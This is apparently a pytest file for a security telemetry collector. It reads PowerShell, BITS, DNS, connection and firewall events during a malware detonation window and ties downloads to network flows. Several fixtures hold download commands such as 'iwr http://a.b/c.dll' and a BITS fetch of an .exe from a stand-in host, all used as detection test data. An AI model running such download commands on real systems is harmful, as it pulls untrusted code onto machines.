def test_a_cursor_never_runs_backwards_and_an_explicit_one_is_taken_as_it_is(tmp_path):
    seen = []
    results = iter([([{"time": iso(0), "fields": {}}], 5000), ([], 120), ([], 0)])

    def read_firewall(since=None):
        seen.append(since)
        return next(results)

    store, c = collector(tmp_path, readers(firewall=read_firewall))
    for _ in range(3):
        c.tick()
    assert seen == [None, 5000, 120]                 # the log was rotated: the reader says so, the collector follows
    older = iter([[ps("iwr http://a.b/c.dll", record_id=50)], [ps("iwr http://a.b/d.dll", record_id=10)], []])
    seen2 = []

    def read_ps(since=None):
        seen2.append(since)
        return next(older)

    store2, c2 = collector(tmp_path, readers(powershell=read_ps))
    for _ in range(3):
        c2.tick()
    assert seen2 == [None, 50, 50]


def test_the_powershell_reader_keeps_event_record_ids_and_events_without_any_are_refused(tmp_path):
    seen = []
    results = iter([[ps("iwr http://a.b/c.dll", record_id=31)], [ps("iwr http://a.b/d.dll")], []])

    def read_ps(since=None):
        seen.append(since)
        return next(results)

    store, c = collector(tmp_path, readers(powershell=read_ps))
    c.tick()
    assert store.stats()["status"]["powershell"] == "ok"
    c.tick()
    assert store.stats()["status"]["powershell"] == "unavailable"
    assert "record_id" in store.stats()["hints"]["powershell"] and len(store.powershell()) == 1
    c.tick()
    assert seen == [None, 31, 31]


def test_a_reader_that_reports_an_error_marks_the_source_unavailable_and_recovers(tmp_path):
    answers = iter([[{"error": "Sysmon event query timed out"}], [conn(t=0)]])
    store, c = collector(tmp_path, readers(connections=lambda **k: next(answers)))
    c.tick()
    assert store.stats()["status"]["connections"] == "unavailable"
    assert store.stats()["hints"]["connections"] == "Sysmon event query timed out"
    c.tick()
    assert store.stats()["status"]["connections"] == "ok" and store.stats()["hints"]["connections"] == ""


def test_a_missing_reader_is_a_status_not_a_crash(tmp_path):
    rs = readers()
    del rs["dns"]
    store, c = collector(tmp_path, rs)
    c.tick()
    assert store.stats()["status"]["dns"] == "unavailable" and store.stats()["status"]["processes"] == "ok"


def test_bits_is_read_only_inside_the_detonation_window(tmp_path):
    calls = []
    rs = readers(bits=lambda **k: calls.append(k) or [bits("http://a.b/s.exe", record_id=4)])
    store, c = collector(tmp_path, rs, window=False)
    c.tick()
    assert calls == [] and store.stats()["status"]["bits"] == "idle" and store.bits() == []
    store2, c2 = collector(tmp_path, rs, window=True)
    c2.tick()
    assert len(calls) == 1 and len(store2.bits()) == 1 and store2.stats()["status"]["bits"] == "ok"


def test_in_the_window_the_tick_is_lean_and_powershell_and_the_firewall_keep_the_slow_pace(tmp_path):
    calls = []
    spies = {name: (lambda name=name, **k: calls.append(name) or []) for name in firewall_store.SOURCES}
    clock = Clock(BASE)
    _, c = collector(tmp_path, spies, window=True, clock=clock)
    for _ in range(11):                       # t = 0 .. 10
        c.tick()
        clock.t += 1
    for name in ("connections", "dns", "processes", "bits"):
        assert calls.count(name) == 11, name
    assert calls.count("powershell") == 2 and calls.count("firewall") == 2      # t = 0 and t = 10
    assert [n for n in calls[:6]] == ["connections", "dns", "processes", "powershell", "firewall", "bits"]


def test_outside_the_window_every_source_is_read_at_every_tick(tmp_path):
    calls = []
    spies = {name: (lambda name=name, **k: calls.append(name) or []) for name in firewall_store.SOURCES}
    clock = Clock(BASE)
    _, c = collector(tmp_path, spies, window=False, clock=clock)
    for _ in range(3):
        c.tick()
        clock.t += 10
    assert calls.count("powershell") == 3 and calls.count("firewall") == 3 and calls.count("bits") == 0


def test_a_tick_fills_the_whole_store(tmp_path):
    rs = readers(connections=lambda **k: [conn(t=0)],
                 dns=lambda **k: [dns_ev("a.b", "1.2.3.4")],
                 processes=lambda **k: [proc(4812, parent=1)],
                 powershell=lambda **k: [ps("iwr http://a.b/c.dll", record_id=3)])
    store, c = collector(tmp_path, rs)
    added = c.tick()
    assert added == {"connections": 1, "dns": 1, "processes": 1, "powershell": 1, "firewall": 0}
    stats = store.stats()
    assert stats["counts"] == {"connections": 1, "dns": 1, "processes": 1, "powershell": 1, "firewall": 0, "bits": 0}
    assert stats["oldest"] == "2026-11-14T10:00:00.000Z" and set(stats["status"].values()) == {"ok", "idle"}


def test_the_whole_chain_from_a_reader_to_a_finding(tmp_path):
    rs = readers(connections=lambda **k: [conn(t=2, dst="1.2.3.4", dport=80)],
                 dns=lambda **k: [dns_ev("a.b", "1.2.3.4", t=1)],
                 processes=lambda **k: [proc(4812, parent=1)],
                 powershell=lambda **k: [ps("iwr http://a.b/c.dll", t=1, record_id=3)])
    store, c = collector(tmp_path, rs)
    c.tick()
    flows = firewall.classify(store.events(), store.firewall_events(),
                              firewall.Context(dns=store.dns(), processes=store.processes()))
    found = download_findings(store.powershell(), store.process_events(), store.bits(), flows, {4812})
    assert [(f["url"], f["dst_ip"], f["dst_port"], f["in_detonation"]) for f in found] == \
        [("http://a.b/c.dll", "1.2.3.4", 80, True)]
